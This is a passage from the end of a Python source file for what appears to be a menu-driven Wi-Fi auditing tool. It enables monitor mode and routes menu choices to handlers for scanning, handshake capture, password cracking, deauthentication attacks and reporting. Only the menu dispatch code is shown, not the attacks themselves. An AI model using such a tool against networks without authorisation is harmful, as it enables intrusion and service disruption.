        # Enable monitor mode
        if not self.scanner.enable_monitor_mode():
            sys.exit(1)
        
        # Main loop
        while True:
            try:
                choice = self.main_menu()
                
                if choice == "1":
                    self.handle_scan()
                elif choice == "2":
                    self.handle_show_networks()
                elif choice == "3":
                    self.handle_handshake()
                elif choice == "4":
                    self.handle_crack()
                elif choice == "5":
                    self.handle_audit()
                elif choice == "6":
                    self.handle_deauth()
                elif choice == "7":
                    self.handle_report()
                elif choice == "8":
                    self.handle_help()
                elif choice == "9":
                    console.print("\n[red]👋 Goodbye! Stay ethical![/red]")
                    self.scanner.cleanup()
                    break
                else:
                    console.print("\n[red]❌ Invalid option![/red]")
                
                if choice != "9":
                    input("\n[dim]Press Enter to continue...[/dim]")
                    
            except KeyboardInterrupt:
                console.print("\n[yellow]⏹️ Interrupted![/yellow]")
                self.scanner.cleanup()
                break
            except Exception as e:
                console.print(f"\n[red]❌ Error: {e}[/red]")
                Utils.log(f"Error: {e}")

# ============================================================================
# ENTRY POINT
# ============================================================================

if __name__ == "__main__":
    try:
        app = WiFiAuditorApp()
        app.run()
    except KeyboardInterrupt:
        console.print("\n[yellow]👋 Goodbye![/yellow]")
        sys.exit(0)
    except Exception as e:
        console.print(f"\n[red]❌ Fatal Error: {e}[/red]")
        sys.exit(1)
